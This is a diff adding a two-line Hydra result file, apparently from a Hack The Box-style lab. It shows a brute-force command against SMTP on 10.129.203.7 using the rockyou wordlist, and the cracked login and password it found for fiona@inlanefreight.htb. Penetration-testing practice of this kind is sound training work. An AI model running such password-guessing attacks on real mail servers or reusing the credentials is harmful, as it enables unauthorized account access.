@@ -1,0 +1,2 @@
+# Hydra v9.6 run at 2026-04-22 13:50:53 on 10.129.203.7 smtp (hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 32 -o /tmp/hydra_fiona.txt smtp://10.129.203.7:587)
+[587][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
